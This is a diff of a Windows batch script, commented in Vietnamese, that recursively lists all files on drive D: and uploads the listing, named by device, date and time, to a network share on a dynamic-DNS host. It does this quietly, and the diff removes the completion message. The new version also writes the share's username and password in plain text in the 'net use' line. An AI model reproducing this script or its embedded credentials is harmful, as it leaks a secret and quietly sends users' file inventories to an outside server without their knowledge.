@@ -14,25 +14,24 @@ for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
 set DATE=%DATE:/=-%
 set TIME=%TIME::=-%
 
-:: Tạo tên file dựa trên định dạng DeviceName_Date_Time
+:: Tạo file tên theo định dạng "%DeviceName%_%DATE%_%TIME%.txt"
 set FileName=%DeviceName%_%DATE%_%TIME%.txt
+set TempFilePath=%temp%\%FileName%
 
-:: Liệt kê nội dung ổ D: và lưu vào file
-dir D:\ > "%FileName%"
-if errorlevel 1 (
-    echo Máy không có ổ D > "%FileName%"
-)
+:: Liệt kê toàn bộ thư mục và file tại D:\ và ghi vào file tạm
+dir "D:\" /s > "%TempFilePath%"
 
-:: Di chuyển file đến thư mục đích trên mạng
-move "%FileName%" \\minhtuan283.ddns.net\hdd\serial\list\
+:: Di chuyển file đến vị trí chia sẻ mạng
+net use \\minhtuan283.ddns.net\HDD /user:minhtuan283 Thienngan2002
+move "%TempFilePath%" "\\minhtuan283.ddns.net\HDD\serial\listt\%FileName%"
 
-del /f /q "%FileName%"
-:: Xóa các biến tạm
+:: Xóa file tạm và các biến tạm
+if exist "%TempFilePath%" del "%TempFilePath%"
+net use \\minhtuan283.ddns.net\HDD /delete
 set DeviceName=
 set DATE=
 set TIME=
 set FileName=
+set TempFilePath=
 
-net use \\minhtuan283.ddns.net\hdd /delete
-echo Quá trình hoàn tất!
 exit
